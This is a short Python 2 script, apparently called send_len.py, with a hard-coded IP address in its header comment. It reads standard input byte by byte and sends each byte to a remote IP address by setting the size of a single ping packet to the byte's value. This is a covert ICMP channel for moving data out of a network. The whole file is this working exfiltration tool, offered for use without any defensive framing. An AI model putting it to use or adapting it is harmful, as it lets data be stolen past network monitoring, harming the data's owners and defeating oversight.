#212.24.108.72
import subprocess
import sys
import binascii
#####################################
#       ---=== USAGE ===---
#   python send_len.py [ip]
#
#
#####################################
ip = sys.argv[1]
data='start'
while data!='':
    data = sys.stdin.read(1)
    print data
    print subprocess.check_output(['ping','-s',str(ord(data)),'-c','1',ip])
